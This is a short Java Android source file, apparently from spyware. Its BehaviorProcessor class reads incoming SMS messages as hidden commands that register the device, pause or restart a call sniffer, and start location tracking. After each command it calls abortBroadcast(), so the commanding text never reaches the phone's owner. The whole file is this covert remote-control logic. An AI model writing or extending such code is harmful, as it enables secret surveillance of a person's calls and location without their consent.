package sms.sniff.behaviors;

import java.util.Arrays;
import java.util.List;

import sms.sniff.behaviors.call.PauseCallSniffer;
import sms.sniff.behaviors.call.RestartCallSniffer;
import sms.sniff.behaviors.core.Pause;
import sms.sniff.behaviors.core.Register;
import sms.sniff.behaviors.core.Start;
import sms.sniff.behaviors.location.StartLocation;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.telephony.SmsMessage;

public class BehaviorProcessor {

	private BroadcastReceiver receiver;
	private Context context;

	public BehaviorProcessor(BroadcastReceiver receiver, Context context) {
		this.receiver = receiver;
		this.context = context;
	}

	public void process(SmsMessage sms) {
		List<Behavior> behaviors = Arrays.asList(
			new Register(context),
			new Start(context),
			new Pause(context),
			new PauseCallSniffer(context),
			new RestartCallSniffer(context),
			new StartLocation(context)
		);
		
		for (Behavior behavior : behaviors) {
			if(behavior.canProcess(sms)) {
				behavior.process(sms);
				receiver.abortBroadcast();
			}
		}
	}
}
